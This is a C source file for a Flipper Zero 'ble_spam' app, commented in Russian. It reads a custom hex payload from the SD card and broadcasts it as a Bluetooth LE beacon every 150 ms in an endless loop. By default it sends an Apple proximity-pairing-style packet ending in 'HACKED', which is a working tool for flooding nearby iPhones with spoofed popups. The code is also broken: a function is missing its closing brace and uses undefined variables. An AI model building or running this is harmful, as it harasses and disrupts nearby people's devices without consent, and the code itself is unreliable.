#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_bt.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include "protocols/_registry.h"

#include <storage/storage.h>
#define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
#define MAX_CUSTOM_PAYLOAD_LEN 31

static uint8_t custom_payload[MAX_CUSTOM_PAYLOAD_LEN];
static uint8_t custom_payload_len = 0;

static uint8_t hex_to_byte(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void load_custom_apple_packet(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    custom_payload_len = 0;
    if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buffer[128]; // Корректный массив-буфер для чтения строки
        uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
        if(read > 0) {
            buffer[read] = '\0';
            char* hex_start = strchr(buffer, ':');
            if(hex_start) {
                hex_start++;
                while(*hex_start && custom_payload_len < MAX_CUSTOM_PAYLOAD_LEN) {
                    if(*hex_start == ' ' || *hex_start == '\r' || *hex_start == '\n') {
                        hex_start++;
                        continue;
                    }
                    if(*hex_start && *(hex_start + 1)) {
                        custom_payload[custom_payload_len] = (hex_to_byte(*hex_start) << 4) | hex_to_byte(*(hex_start + 1));
                        custom_payload_len++;
                        hex_start += 2;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}
/* Конец нашего блока */

// Перехватчик отправки пакета BLE в радиоэфир
void ble_spam_send_packet(const uint8_t* original_data, uint8_t original_len) {
    // Наш перехватчик:
    load_custom_apple_packet();
        if(custom_payload_len > 0) {
            furi_hal_bt_extra_beacon_set_data(custom_payload, custom_payload_len);
        } else {
    // Здесь оставьте оригинальную строчку, которая была в коде изначально, например:
            furi_hal_bt_extra_beacon_set_data(tx_data, tx_len); 
        }

// Главная точка входа приложения Flipper Zero (согласно манифесту application.fam)
int32_t ble_spam_app(void* p) {
    UNUSED(p);
    
    // Инициализируем Bluetooth маяк
    furi_hal_bt_extra_beacon_stop();
    
    // Небольшой цикл-заглушка для генерации пакетов. 
    // Приложение при запуске сразу включит трансляцию пакета
    uint8_t default_pack[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x10, 0x42, 0x04, 0x48, 0x41, 0x43, 0x4B, 0x45, 0x44};
    
    while(1) {
        // Вызываем наш перехватчик вместо прямой отправки
        ble_spam_send_packet(default_pack, sizeof(default_pack));
        furi_hal_bt_extra_beacon_start();
        
        // Каждые 150 миллисекунд шлем пакет в эфир
        furi_delay_ms(150);
        
        furi_hal_bt_extra_beacon_stop();
        
        // Проверяем, не нажал ли пользователь кнопку Назад (Exit)
        // Чтобы выйти из бесконечного цикла приложения, удерживайте кнопку назад на Флиппере
        if(furi_hal_gpio_read(&gpio_button_back) == false) {
            break;
        }
    }

    return 0;
}
